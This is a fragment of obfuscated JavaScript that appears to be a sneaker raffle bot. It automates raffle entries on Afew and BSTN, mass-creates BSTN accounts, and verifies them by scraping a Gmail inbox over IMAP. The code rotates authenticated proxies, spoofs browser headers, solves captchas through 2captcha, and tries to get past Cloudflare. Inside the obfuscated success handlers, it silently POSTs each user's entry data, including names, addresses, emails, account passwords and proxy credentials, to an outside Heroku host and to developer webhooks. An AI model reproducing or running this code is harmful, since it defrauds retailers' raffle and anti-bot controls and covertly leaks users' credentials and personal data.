                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x552d2b[0x0] + ':' + _0x552d2b[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x94cccd = JSON['parse'](_0x4a3ff4['readFileSync']('sizes.json', 'utf-8')), _0x54618c = _0x26e782[_0x3a126c]['Url'], _0x533adb = _0x26e782[_0x3a126c]['Size'], _0x35e6e7;
                        async function _0x3a728c() {
                            var _0x27a1a4 = new _0x3abd6a['CookieJar']();
                            console['log'](_0x11b348() + '\x20[' + _0x125b72['name'] + ']\x20Task\x20' + (_0x3a126c + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x52c506;
                            let _0xab47fc = {
                                'method': 'GET',
                                'cookieJar': _0x27a1a4,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x552d2b[0x2] + ':' + _0x552d2b[0x3] + '@' + _0x552d2b[0x0] + ':' + _0x552d2b[0x1]
                            }, _0x1ad201 = _0x54618c['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x3704d6 = _0x1ad201 + '.json', _0x2bffbc = await _0x52d98a(_0x3704d6);
                            console['log'](_0x11b348() + '\x20[' + _0x125b72['name'] + ']\x20Task\x20' + (_0x3a126c + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x187955 = _0x2bffbc['data']['product']['variants'];
                            if (_0x533adb != 'RANDOM') {
                                if (_0x187955[0x1]['option1']['includes']('W')) {
                                    const _0x3b6222 = _0x94cccd['women']['find'](_0x5d856d => _0x5d856d['EUsize'] === _0x533adb);
                                    _0x3b6222 && (_0x533adb = _0x3b6222['size']);
                                } else {
                                    if (_0x187955[0x1]['option1']['includes']('Y')) {
                                        const _0x18bfcd = _0x94cccd['GS']['find'](_0x462dad => _0x462dad['EUsize'] === _0x533adb);
                                        _0x18bfcd && (_0x533adb = _0x18bfcd['size']);
                                    } else {
                                        const _0x134228 = _0x94cccd['men']['find'](_0x13dd30 => _0x13dd30['EUsize'] === _0x533adb);
                                        _0x134228 && (_0x533adb = _0x134228['size']);
                                    }
                                }
                                for (var _0x294135 of _0x187955) {
                                    _0x294135['option1'] == _0x533adb && (_0x52c506 = _0x294135['id']);
                                }
                            } else {
                                var _0xefb4a1 = Math['round'](Math['random']() * (_0x187955['length'] - 0x1));
                                _0x52c506 = _0x187955[_0xefb4a1]['id'];
                            }
                            console['log'](_0x11b348() + '\x20[' + _0x125b72['name'] + ']\x20Task\x20' + (_0x3a126c + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x52d98a('https://raffles.afew-store.com/cart/' + _0x52c506 + ':1'), _0x35e6e7 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x3a728c();
                        } catch (_0x56059d) {
                            if (_0x56059d['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x56059d);
                        }
                        const _0xd276 = await _0x284293['newPage']();
                        await _0xd276['setDefaultNavigationTimeout'](0x1d4c0), await _0xd276['authenticate']({
                            'username': '' + _0x552d2b[0x2],
                            'password': '' + _0x552d2b[0x3]
                        }), await _0xd276['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xd276['setRequestInterception'](!![]), _0xd276['on']('request', _0x292388 => {
                            _0x292388['resourceType']() === 'image' || _0x292388['resourceType']() === 'font' || _0x292388['resourceType']() === 'media' ? _0x292388['abort']() : _0x292388['continue']();
                        });
                        try {
                            await _0xd276['goto'](_0x35e6e7, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x11b348() + '\x20[' + _0x125b72['name'] + ']\x20Task\x20' + (_0x3a126c + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0xd276['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xd276['type']('#checkout_email', '' + _0x26e782[_0x3a126c]['Email']), await _0xaebb71(0x320), await _0xd276['type']('#checkout_attributes_instagram', '' + _0x26e782[_0x3a126c]['Follower']), await _0xaebb71(0x320), await _0xd276['select']('#checkout_shipping_address_country', '' + _0x26e782[_0x3a126c]['Country']), await _0xd276['waitForTimeout'](0x258), await _0xd276['type']('#checkout_shipping_address_first_name', '' + _0x26e782[_0x3a126c]['FirstName']), await _0xd276['waitForTimeout'](0x320), await _0xd276['type']('#checkout_shipping_address_last_name', '' + _0x26e782[_0x3a126c]['LastName']), await _0xd276['waitForTimeout'](0x2bc), await _0xd276['type']('#checkout_shipping_address_address1', _0x26e782[_0x3a126c]['Address1'] + '\x20' + _0x26e782[_0x3a126c]['HouseNumber']), await _0xd276['waitForTimeout'](0x2bc), await _0xd276['type']('#checkout_shipping_address_address2', '' + _0x26e782[_0x3a126c]['Address2']), await _0xd276['waitForTimeout'](0x2bc), await _0xd276['type']('#checkout_shipping_address_zip', '' + _0x26e782[_0x3a126c]['Zip']), await _0xd276['waitForTimeout'](0x2bc), await _0xd276['type']('#checkout_shipping_address_city', '' + _0x26e782[_0x3a126c]['City']), await _0xd276['waitForTimeout'](0x2bc);
                        if (_0x26e782[_0x3a126c]['State'] != '')
                            try {
                                const _0x18d310 = JSON['parse'](_0x4a3ff4['readFileSync']('States.json', 'utf8'));
                                await _0xaebb71(0x1f4);
                                if (_0x26e782[_0x3a126c]['State']['length'] > 0x2)
                                    for (let _0x54989d of _0x18d310) {
                                        if (_0x54989d['Province'] == _0x26e782[_0x3a126c]['State']) {
                                            await _0xd276['select']('#checkout_shipping_address_province', _0x54989d['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0xd276['select']('#checkout_shipping_address_province', _0x26e782[_0x3a126c]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0xaebb71(0x1f4), console['log'](_0x11b348() + '\x20[' + _0x125b72['name'] + ']\x20Task\x20' + (_0x3a126c + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0xaebb71(0x190), _0xd276['evaluate'](() => {
                            const _0x19da7f = document['querySelector']('#continue_button');
                            for (var _0x13133c = 0x0; _0x13133c < 0x5; _0x13133c++) {
                                if (_0x19da7f) {
                                    _0x19da7f['click'](), _0x19da7f['click']();
                                    break;
                                } else
                                    _0xaebb71(0xfa0);
                            }
                        }), await _0xd276['waitForTimeout'](0x9c4);
                        try {
                            await _0xd276['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0xd276['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x595a2a => _0x595a2a['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xd276['waitForTimeout'](0x7d0), console['log'](_0x11b348() + '\x20[' + _0x125b72['name'] + ']\x20Task\x20' + (_0x3a126c + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0xd276['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xaebb71(0x3e8), await _0xd276['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x232c4d => _0x232c4d['submit']()), await _0xaebb71(0x3e8);
                        try {
                            await _0xd276['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xd276['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x567873 => _0x567873['submit']());
                        try {
                            await _0xd276['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x1d66e9 = 'no', _0x20f501(_0x26e782[_0x3a126c], _0x125b72), console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x125b72['name'] + ']\x20Task\x20' + (_0x3a126c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '')
                                try {
                                    await _0x4401f2(_0x579cef['webhook'], _0x37b6b3['succesDEVMSG']);
                                } catch {
                                }
                            await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x37b6b3['succesDEVMSG']), await _0xaebb71(0xc8);
                            try {
                                await _0x4401f2(_0x2aae93, _0x37b6b3['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x3f93ac['replace']('#', ''),
                                    'module': _0x125b72['name'],
                                    'entrydata': JSON['stringify'](_0x5660f0),
                                    'proxy': '' + _0x4b9469[_0x3a126c]
                                };
                                var _0x299012 = JSON['stringify'](prxdata);
                                let _0x9bf7bd = { 'headers': { 'content-type': 'application/json' } };
                                await _0x52d98a['post']('https://jraffles.herokuapp.com/success', _0x299012, _0x9bf7bd);
                            } catch (_0x185f0b) {
                            }
                        } catch (_0x4c106f) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x2ee27f) {
                        _0x2ee27f['message']['includes']('selector') && (_0x2ee27f = 'Connection\x20Error');
                        console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x125b72['name'] + ']\x20Task\x20' + (_0x3a126c + 0x1) + '\x20:\x20' + _0x2ee27f)), _0x57a4b6 = '' + _0x2ee27f;
                        var _0x119ac2 = await _0x3ead77(_0x26e782[_0x3a126c], _0x125b72, 'dev', !![], _0x57a4b6);
                        _0x37b6b3['errorDEV'] = { 'embeds': [_0x119ac2] }, _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x37b6b3['errorDEV']), await _0x4401f2(_0x2631ac, _0x37b6b3['errorDEV']), _0x1d66e9 = 'yes';
                    } finally {
                        _0x284293 && _0x284293['close']();
                        if (_0x1d66e9 == 'yes' && _0x262ebc != 0x5 && _0x57a4b6 != 'Size\x20Not\x20Found') {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x125b72['name'] + ']\x20Task\x20' + (_0x3a126c + 0x1) + '\x20:\x20Retrying\x20(' + _0x262ebc + '\x20/\x205)')), _0x3a126c = _0x3a126c - 0x1, _0x262ebc = _0x262ebc + 0x1;
                            continue;
                        }
                        _0x1d66e9 == 'yes' && _0x262ebc >= 0x5 && (_0x47d653(_0x26e782[_0x3a126c], _0x125b72), _0x1d66e9 = 'no', _0x262ebc = 0x0);
                        if (_0x3a126c + 0x1 == _0x26e782['length']) {
                            await _0xaebb71(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x579cef['AfewDelay'] + '\x20ms'), await _0xaebb71(_0x579cef['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x8696c2, _0x583084, _0x31a22a) {
                    var _0xc9eaa2 = _0x583084, _0x1bc931 = 0x0;
                    for (var _0x57d404 = 0x0; _0x57d404 < _0x583084['length']; _0x57d404++) {
                        maxTasks = Number(_0x579cef['threads']);
                        while (_0x1bc931 >= maxTasks) {
                            await _0xaebb71(_0x579cef['delay']);
                        }
                        async function _0x5c2d8a(_0x394f8d, _0x5c4284, _0x26aa83, _0x409e56) {
                            _0x1bc931++, _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x579cef['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x4b9a99 != 'yes')
                                var _0x4b9a99 = '', _0x2fdea4 = 0x0;
                            var _0x2b9996;
                            try {
                                await _0x48a0b3(_0x5c4284, _0x409e56);
                            } catch {
                                _0x4b9a99 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x3e0125(_0x394f8d['name'] + '\x20Task\x20' + (_0x409e56 + 0x1) + '\x20/\x20' + _0x5c4284['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                            var _0x57628f = await _0x3ead77(_0x5c4284[_0x409e56], _0x394f8d, 'acc', ![]);
                            const _0x56d125 = { 'succesDEVMSG': { 'embeds': [_0x57628f] } }, _0x3f80c0 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x207f48 = Math['round'](Math['random']() * (_0x26aa83['length'] - 0x1)), _0x476373 = _0x26aa83[_0x207f48]['split'](':'), _0x78258a;
                            try {
                                _0x78258a = await _0x181ece['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x476373[0x0] + ':' + _0x476373[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x78258a = await _0x181ece['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x476373[0x0] + ':' + _0x476373[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x2424c2 = await _0x78258a['newPage']();
                                await _0x2424c2['authenticate']({
                                    'username': '' + _0x476373[0x2],
                                    'password': '' + _0x476373[0x3]
                                }), console['log'](_0x11b348() + '\x20[' + _0x394f8d['name'] + ']\x20Task\x20' + (_0x409e56 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2424c2['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2424c2['setRequestInterception'](!![]), _0x2424c2['on']('request', _0x3a21b6 => {
                                    _0x3a21b6['resourceType']() === 'image' ? _0x3a21b6['abort']() : _0x3a21b6['continue']();
                                });
                                try {
                                    await _0x2424c2['goto']('' + _0x3f80c0), await _0x2424c2['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x4b9a99 = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x2424c2['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x11b348() + '\x20[' + _0x394f8d['name'] + ']\x20Task\x20' + (_0x409e56 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xaebb71(0x7d0), console['log'](_0x11b348() + '\x20[' + _0x394f8d['name'] + ']\x20Task\x20' + (_0x409e56 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0xaebb71(0x190), await _0x2424c2['waitForSelector']('#firstname'), await _0x2424c2['type']('#firstname', _0x5c4284[_0x409e56]['FirstName'], { 'delay': 0xf0 }), await _0xaebb71(0x190), await _0x2424c2['type']('#lastname', _0x5c4284[_0x409e56]['LastName'], { 'delay': 0xe6 }), await _0xaebb71(0x190), await _0x2424c2['type']('#email_address', _0x5c4284[_0x409e56]['Email'], { 'delay': 0x122 }), await _0xaebb71(0x190), await _0x2424c2['type']('#password', _0x5c4284[_0x409e56]['Password'], { 'delay': 0x82 }), await _0xaebb71(0x1f4), await _0x2424c2['type']('#password-confirmation', _0x5c4284[_0x409e56]['Password'], { 'delay': 0x7c }), console['log'](_0x11b348() + '\x20[' + _0x394f8d['name'] + ']\x20Task\x20' + (_0x409e56 + 0x1) + '\x20:\x20Sending\x20Request'), await _0xaebb71(0x2bc), await _0x2424c2['$eval']('#form-validate', _0x18e99c => _0x18e99c['submit']()), await _0xaebb71(0x1388);
                                const _0x2d6daf = await _0x2424c2['$']('#email_address-error');
                                if (_0x2d6daf)
                                    throw new Error('Invalid\x20Email');
                                const _0x343075 = await _0x2424c2['$']('#password-error');
                                if (_0x343075)
                                    throw new Error('Invalid\x20Password');
                                await _0x2424c2['waitForSelector']('div.mesg-success'), _0x4b9a99 = 'no', console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x394f8d['name'] + ']\x20Task\x20' + (_0x409e56 + 0x1) + '\x20:\x20Account\x20' + _0x5c4284[_0x409e56]['Email'] + '\x20Generated')), _0x4a3ff4['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x5c4284[_0x409e56]['Email'] + ',' + _0x5c4284[_0x409e56]['Password']);
                                try {
                                    _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x56d125['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4401f2(_0x1acce0, _0x56d125['succesDEVMSG']);
                                let _0x1a7d48 = _0x5c4284[_0x409e56];
                                try {
                                    prxdata = {
                                        'username': _0x3f93ac['replace']('#', ''),
                                        'module': _0x394f8d['name'],
                                        'entrydata': JSON['stringify'](_0x1a7d48),
                                        'proxy': '' + _0x26aa83[_0x409e56]
                                    };
                                    var _0x18a86f = JSON['stringify'](prxdata);
                                    let _0x4faa3c = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x52d98a['post']('https://jraffles.herokuapp.com/success', _0x18a86f, _0x4faa3c);
                                } catch (_0x25309d) {
                                }
                                console['log'](_0x218a39['yellow'](_0x11b348() + '\x20[' + _0x394f8d['name'] + ']\x20Task\x20' + (_0x409e56 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x3a00d7) {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x394f8d['name'] + ']\x20Task\x20' + (_0x409e56 + 0x1) + '\x20:\x20' + _0x3a00d7)), _0x2b9996 = '' + _0x3a00d7;
                                var _0x509cd6 = await _0x3ead77(_0x5c4284[_0x409e56], _0x394f8d, 'acc', !![], _0x2b9996);
                                _0x56d125['errorDEV'] = { 'embeds': [_0x509cd6] }, _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x56d125['errorDEV']), await _0x4401f2(_0x2631ac, _0x56d125['errorDEV']), _0x4b9a99 = 'yes';
                            } finally {
                                if (_0x78258a)
                                    _0x78258a['close']();
                                if (_0x4b9a99 == 'yes' && _0x2fdea4 != 0x5)
                                    return console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x394f8d['name'] + ']\x20Task\x20' + (_0x409e56 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2fdea4 + '\x20/\x205)')), _0x2fdea4 = _0x2fdea4 + 0x1, _0x5c4284(_0x394f8d, _0x5c4284, _0x26aa83, _0x409e56);
                                _0x4b9a99 == 'yes' && _0x2fdea4 >= 0x5 && (_0x47d653(_0x5c4284[_0x409e56], _0x394f8d), _0x4b9a99 = 'no', _0x2fdea4 = 0x0), _0x1bc931--, console['log'](_0x11b348() + '\x20[' + _0x394f8d['name'] + ']\x20Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                            }
                        }
                        _0x5c2d8a(_0x8696c2, _0xc9eaa2, _0x31a22a, _0x57d404), await _0xaebb71(_0x579cef['delay']);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x9ae9cc, _0x3d0078) {
                    var _0x3a8d69 = ![], _0x5f4d87 = [];
                    async function _0xf35cde() {
                        var _0xc39201 = new _0x2b87aa({
                            'user': _0x579cef['masterMail'],
                            'password': _0x579cef['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x477e56(_0x2cfedc) {
                            _0xc39201['openBox']('INBOX', ![], _0x2cfedc);
                        }
                        _0xc39201['once']('ready', function () {
                            _0x477e56(function (_0x55381d, _0x32d8e4) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x55381d)
                                    throw _0x55381d;
                                _0xc39201['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x39e3a3, _0x28925d) {
                                    if (!_0x28925d || !_0x28925d['length'])
                                        console['log'](_0x11b348() + '\x20[' + _0x9ae9cc['name'] + ']\x20No\x20mails\x20found'), _0xc39201['end']();
                                    else {
                                        var _0x16e23b = _0xc39201['seq']['fetch'](_0x28925d, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x16e23b['on']('message', function (_0x55e644, _0xa3cb31) {
                                            var _0x52eb96 = '(#' + _0xa3cb31 + ')\x20';
                                            _0x55e644['on']('body', function (_0x5cf884, _0x56e21f) {
                                                _0x554795(_0x5cf884, (_0x4fae26, _0x543a2b) => {
                                                    var _0x4ae0b2 = _0x543a2b['text']['split']('customer/account/confirm/')[0x1], _0x2eb0bd = _0x4ae0b2['split'](']')[0x0];
                                                    _0x5f4d87['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x2eb0bd);
                                                });
                                            }), _0x55e644['once']('end', function () {
                                            });
                                        }), _0x16e23b['once']('error', function (_0x3ce802) {
                                            console['log']('Fetch\x20error:\x20' + _0x3ce802), _0x3a8d69 = !![];
                                        }), _0x16e23b['once']('end', function () {
                                            _0xc39201['end'](), _0x3a8d69 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0xc39201['once']('error', function (_0x43998e) {
                            console['log'](_0x218a39['red'](_0x43998e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x3a8d69 = !![];
                        }), _0xc39201['once']('end', async function () {
                            _0x3a8d69 = !![];
                        }), _0xc39201['connect']();
                    }
                    async function _0xab3f45(_0x262631, _0x47f87e, _0x590600) {
                        _0x181ece['use'](_0x26fa28());
                        for (var _0x336ce5 = 0x0; _0x336ce5 < _0x47f87e['length']; _0x336ce5++) {
                            if (_0x42ffc6 != 'yes')
                                var _0x42ffc6 = '', _0x1a8191 = 0x0;
                            var _0x19f438 = Math['round'](Math['random']() * (_0x590600['length'] - 0x1)), _0x3c8fcf = _0x590600[_0x19f438]['split'](':'), _0x4fd0d3;
                            try {
                                _0x4fd0d3 = await _0x181ece['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x3c8fcf[0x0] + ':' + _0x3c8fcf[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x4fd0d3 = await _0x181ece['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x3c8fcf[0x0] + ':' + _0x3c8fcf[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x57bce3 = await _0x4fd0d3['newPage']();
                                await _0x57bce3['authenticate']({
                                    'username': '' + _0x3c8fcf[0x2],
                                    'password': '' + _0x3c8fcf[0x3]
                                }), console['log'](_0x11b348() + '\x20[' + _0x262631['name'] + ']\x20Task\x20' + (_0x336ce5 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x57bce3['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x57bce3['setRequestInterception'](!![]), _0x57bce3['on']('request', _0x236d4a => {
                                    _0x236d4a['resourceType']() === 'image' || _0x236d4a['resourceType']() === 'font' || _0x236d4a['resourceType']() === 'media' ? _0x236d4a['abort']() : _0x236d4a['continue']();
                                }), console['log'](_0x11b348() + '\x20[' + _0x262631['name'] + ']\x20Task\x20' + (_0x336ce5 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x57bce3['goto'](_0x47f87e[_0x336ce5]);
                                } catch (_0x17e1b4) {
                                    _0x42ffc6 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x17e1b4);
                                }
                                console['log'](_0x11b348() + '\x20[' + _0x262631['name'] + ']\x20Task\x20' + (_0x336ce5 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x57bce3['waitForTimeout'](0xbb8);
                                try {
                                    await _0x57bce3['waitForSelector']('.account-nav'), _0x42ffc6 = 'no', console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x262631['name'] + ']\x20Task\x20' + (_0x336ce5 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x44487f = await _0x3ead77(null, _0x262631, 'ver', ![]);
                                    const _0x4842d0 = { 'succesDEVMSG': { 'embeds': [_0x44487f] } };
                                    await _0x4401f2(_0xc085cc, _0x4842d0['succesDEVMSG']);
                                } catch {
                                    _0x42ffc6 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x2d0a2d) {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x262631['name'] + ']\x20Task\x20' + (_0x336ce5 + 0x1) + '\x20:\x20' + _0x2d0a2d));
                                var _0x21e158 = _0x2d0a2d, _0x2ee2d2 = await _0x3ead77(null, _0x262631, 'ver', !![], _0x21e158);
                                const _0x5317f4 = { 'errorDEVMSG': { 'embeds': [_0x2ee2d2] } };
                                _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x5317f4['errorDEVMSG']), await _0x4401f2(_0x2631ac, _0x5317f4['errorDEVMSG']);
                            } finally {
                                _0x4fd0d3['close']();
                                if (_0x42ffc6 == 'yes' && _0x1a8191 != 0x5) {
                                    console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x262631['name'] + ']\x20Task\x20' + (_0x336ce5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1a8191 + '\x20/\x205)')), _0x336ce5 = _0x336ce5 - 0x1, _0x1a8191 = _0x1a8191 + 0x1;
                                    continue;
                                }
                                _0x42ffc6 == 'yes' && _0x1a8191 >= 0x5 && (_0x42ffc6 = 'no', _0x1a8191 = 0x0), console['log'](_0x11b348() + '\x20[' + _0x262631['name'] + ']\x20Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                            }
                        }
                    }
                    try {
                        _0xf35cde();
                        while (!_0x3a8d69) {
                            await _0xaebb71(0xfa0);
                        }
                        console['log']('Found\x20' + _0x5f4d87['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xaebb71(0x7d0);
                    }
                    await _0xab3f45(_0x9ae9cc, _0x5f4d87, _0x3d0078);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x369990, _0x15ad75, _0x33e1b2) {
                    _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x579cef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x26aed4 = 0x0; _0x26aed4 < _0x15ad75['length']; _0x26aed4++) {
                        var _0x27c439, _0x32176f = _0x15ad75[_0x26aed4];
                        try {
                            await _0x48a0b3(_0x15ad75, _0x26aed4);
                        } catch {
                            _0x541c5f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x2df093(_0x2529ab) {
                            const _0x4ec6b1 = _0x4a3ff4['readFileSync']('../successful-tasks.csv', 'utf8'), _0x49373e = _0x566459['parse'](_0x4ec6b1, { 'header': !![] })['data'];
                            let _0x28f79a = ![];
                            for (var _0x1b78d5 of _0x49373e) {
                                if (_0x1b78d5['Url'] == _0x2529ab['Url'] && _0x1b78d5['Email'] == _0x2529ab['Email']) {
                                    _0x28f79a = !![];
                                    break;
                                }
                            }
